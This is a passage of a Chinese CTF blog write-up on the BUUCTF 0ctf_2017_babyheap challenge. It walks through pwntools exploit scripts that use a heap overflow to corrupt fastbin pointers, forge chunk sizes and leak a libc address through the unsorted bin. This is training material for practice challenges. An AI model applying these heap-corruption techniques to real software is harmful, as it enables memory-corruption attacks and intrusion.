class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./unsortedbin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">p,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">p,index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">p,index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">p,index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 0 </span></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 1</span></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 2</span></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 3</span></span><br><span class="line">    allocate(p,<span class="number">0x80</span>) <span class="comment"># chunk 4</span></span><br><span class="line"></span><br><span class="line">    free(p,<span class="number">1</span>)</span><br><span class="line">    free(p,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#chunk4 = 0x55be3471c080</span></span><br><span class="line">    payload1 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>) </span><br><span class="line">    fill(p,<span class="number">0</span>,payload1)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>p8(0x80)修改最低字节的两位，其他字节不会影响</p>
+<img src="/HFTTC.github.io/images/pwn/1773052563737-2c68a72f-5bdc-4bd3-a7c9-2b064cdef6ad-386546.png" alt="1773052563737-2c68a72f-5bdc-4bd3-a7c9-2b064cdef6ad.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<p>此时 Fastbin 当中的链表就不再是 chunk2-&gt;chunk1 了，而是  fastbin[0x20 链表头] → chunk2 → chunk4</p>
+<img src="/HFTTC.github.io/images/pwn/1773052877324-a19ec30e-ed30-445d-8594-d5c0292d7a8a-738661.png" alt="1773052877324-a19ec30e-ed30-445d-8594-d5c0292d7a8a.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">此时chunk4虽然没有被free，但已经存在于bin中，若此时在此申请chunk，根据程序Allocate的功能，又会出现一个指向chunk4的结构，也就是完成了双指</font></p>
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">再一次动态申请 chunk4</font></p>
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">在申请之前，有两个问题：</font></p>
+<ul>
+<li><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">Fast Bin符合LIFO，即后进先出，那么先出的就是chunk2而非chunk4，因此我们需要Allocate两次</font></li>
+<li><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">malloc的检查</font></li>
+</ul>
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">malloc的检查什么意思呢？</font></p>
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">我们知道，在Fast Bins中，每个Fast Bin里面的chunk的大小都是一致的。原先chunk1的size大小是0x21，chunk1就会被存储在chunk大小都为0x20的Fast bin中</font></p>
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">那当我们再次malloc一个0x10大小的chunk的时候，就会去chunk大小都为0x20的Fast bin中去查找，但是此时找到一个大小为0x90的chunk，malloc就会检查出异常，因而程序终止。</font></p>
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">因此我们这次通过举例 chunk4 较近的 chunk3 来进行堆溢出去修改 chunk4 的 size 段绕过 glibc 的判断</font></p>
+<img src="/HFTTC.github.io/images/pwn/1773053906683-5e3caf00-a417-4f5e-b62f-14c4dd7210a9-903957.png" alt="1773053906683-5e3caf00-a417-4f5e-b62f-14c4dd7210a9.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./unsortedbin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">p,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">p,index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">p,index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">p,index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 0 </span></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 1</span></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 2</span></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 3</span></span><br><span class="line">    allocate(p,<span class="number">0x80</span>) <span class="comment"># chunk 4</span></span><br><span class="line"></span><br><span class="line">    free(p,<span class="number">1</span>)</span><br><span class="line">    free(p,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">    payload1 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">    fill(p,<span class="number">0</span>,payload1)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># chunk4_fake_size = 0x0000000000000021</span></span><br><span class="line">    payload2 = p64(<span class="number">0</span>)*<span class="number">3</span> + p8(<span class="number">0x21</span>)</span><br><span class="line">    fill(p,<span class="number">3</span>,payload2)</span><br><span class="line">    allocate(p,<span class="number">0x10</span>)</span><br><span class="line">    allocate(p,<span class="number">0x10</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们修改了p8(0x21)就可以成功绕过 malloc 的检查</p>
+<p><img src="/HFTTC.github.io/images/pwn/1773054621896-d8212b61-ac4a-40cc-9f3d-28ef8bc75caf-838405.png" alt="1773054621896-d8212b61-ac4a-40cc-9f3d-28ef8bc75caf.png" style="max-width: 100%; display: block; margin: 0 auto;"><img src="/HFTTC.github.io/images/pwn/1773054952725-3b1ec6f2-ce95-4504-ba82-25f31f82ccc2-544337.png" alt="1773054952725-3b1ec6f2-ce95-4504-ba82-25f31f82ccc2.png" style="max-width: 100%; display: block; margin: 0 auto;"></p>
+<img src="/HFTTC.github.io/images/pwn/1773055500337-58323d65-9ed3-48e2-91d3-d852dfd0b7ed-881455.png" alt="1773055500337-58323d65-9ed3-48e2-91d3-d852dfd0b7ed.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">接下来就是泄露的预处理部分了，即先让chunk4进入Unsorted Bin</font></p>
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">之前也提到过，要让其进入Unsorted Bin需要满足两个条件：</font></p>
+<ul>
+<li><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">释放（free）的chunk大小不属于fast bin的范围</font></li>
+<li><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">该chunk不和top chunk紧邻时</font></li>
+</ul>
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">关于第一条，我们只需要将其大小改回去（0x21 &gt;&gt; 0x91），然后free即可</font></p>
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">关于第二条，由于chunk4是最晚申请的，他就挨着top chunk，我们也可以通过动态调试来验证这一点</font><img src="/HFTTC.github.io/images/pwn/1773054621896-d8212b61-ac4a-40cc-9f3d-28ef8bc75caf-139691.webp" alt="1773054621896-d8212b61-ac4a-40cc-9f3d-28ef8bc75caf.png" style="max-width: 100%; display: block; margin: 0 auto;"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./unsortedbin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">p,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">p,index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">p,index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">p,index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 0 </span></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 1</span></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 2</span></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 3</span></span><br><span class="line">    allocate(p,<span class="number">0x80</span>) <span class="comment"># chunk 4</span></span><br><span class="line"></span><br><span class="line">    free(p,<span class="number">1</span>)</span><br><span class="line">    free(p,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">    payload1 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">    fill(p,<span class="number">0</span>,payload1)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    </span><br><span class="line">    payload2 = p64(<span class="number">0</span>)*<span class="number">3</span> + p8(<span class="number">0x21</span>)</span><br><span class="line">    fill(p,<span class="number">3</span>,payload2)</span><br><span class="line">    allocate(p,<span class="number">0x10</span>)</span><br><span class="line">    allocate(p,<span class="number">0x10</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    </span><br><span class="line">    payload3 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">    fill(p,<span class="number">3</span>,payload3)</span><br><span class="line">    allocate(p,<span class="number">0x80</span>)</span><br><span class="line">    free(p,<span class="number">4</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/images/pwn/1773056156330-9762dbed-46f0-4414-9061-0622f56bb0c0-574851.png" alt="1773056156330-9762dbed-46f0-4414-9061-0622f56bb0c0.png" style="max-width: 100%; display: block; margin: 0 auto;"><img src="/HFTTC.github.io/images/pwn/1773056167297-9ad3f89f-ab15-4640-86bc-179c339e2873-373734.png" alt="1773056167297-9ad3f89f-ab15-4640-86bc-179c339e2873.png" style="max-width: 100%; display: block; margin: 0 auto;"><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">chunk4成功进入unsortedbin，且出现特征：如果usorted bin中只有一个bin ，那么它的fd和bk指针会指向同一个地址，就是unsorted bin链表的头部 </font><font style="color:#DF2A3F;background-color:rgba(255, 255, 255, 0.9);">( main_arena+88 )</font></p>
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">关于计算 libc 基址，我们知道 smallbins，largebins，unsortedbins 统一存放在 malloc_state 这样一个结构体的一个数组当中。malloc_state 是属于 main_arena 的。并且 main_arena 是一个全局变量，位于 libc 的数据段。</font></p>
+<p><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">如果我们知道了</font><font style="color:#DF2A3F;background-color:rgba(255, 255, 255, 0.9);">上述情况当中的 fd&#x2F;bk 指针所指向的地址，那我们也就相当于知道了 main_arena 的基址</font><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">，从而可以知道 libc 的基址</font></p>
+<img src="/HFTTC.github.io/images/pwn/1773056418444-f3a92048-13b6-4271-aa91-c3237fe437a5-941692.png" alt="1773056418444-f3a92048-13b6-4271-aa91-c3237fe437a5.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<p>下面我们需要做的就是进行偏移量的测定。<code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">main_arena+88</font></code> 指向的就是 unsorted bin 的链表头（fd 指针）</p>
+<p>因此我们可以通过泄露 fd 指针的值，去寻找 main_arena</p>
+<blockquote>
+<p>更新: 2026-03-09 19:56:40<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/ag4ilhe8akdtsphx">https://www.yuque.com/idcm/wnemg9/ag4ilhe8akdtsphx</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="[2021长城杯]K1ng_in_h3Ap_I" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/%5B2021%E9%95%BF%E5%9F%8E%E6%9D%AF%5DK1ng_in_h3Ap_I/" aria-label="前一篇: [2021长城杯]K1ng_in_h3Ap_I" title="前一篇: [2021长城杯]K1ng_in_h3Ap_I"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            [2021长城杯]K1ng_in_h3Ap_I
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="Unlink例题分析" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/Unlink%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90/" aria-label="后一篇: Unlink例题分析"  title="后一篇: Unlink例题分析"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          Unlink例题分析
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UnSortedbin-Attack-%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">UnSortedbin Attack 例题分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-0ctf-2017-babyheap"><span class="toc-number">1.1.</span> <span class="toc-text">BUUCTF 0ctf_2017_babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Allocate"><span class="toc-number">1.1.1.</span> <span class="toc-text">Allocate</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fill"><span class="toc-number">1.1.2.</span> <span class="toc-text">Fill</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Free"><span class="toc-number">1.1.3.</span> <span class="toc-text">Free</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dump"><span class="toc-number">1.1.4.</span> <span class="toc-text">Dump</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "UnSortedbinAttack例题分析",
